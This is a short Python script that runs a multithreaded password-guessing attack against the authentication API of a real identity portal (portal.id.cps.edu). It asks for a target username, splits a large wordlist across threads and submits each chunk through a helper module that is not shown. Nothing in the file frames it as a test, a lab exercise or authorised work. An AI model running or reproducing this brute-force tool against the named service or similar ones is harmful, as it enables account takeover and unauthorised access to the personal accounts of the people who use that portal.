import requests
import rid_api
from threading import Thread
from itertools import islice

username = input("Username:")
thread_count = int(input("Number of threads:"))
words_per_thread = int(input("Passwords per thread:"))

api_url = "https://portal.id.cps.edu/api/rest/authn"
wordlist = 'all_in_one_w'
session = requests.session()

with open(wordlist) as f:
    for i in range(0,thread_count):
        next_n_lines = list(islice(f, words_per_thread))
        if not next_n_lines:
            break
        Thread(target=rid_api.test_list, args=(requests.session(), api_url, username, next_n_lines)).start()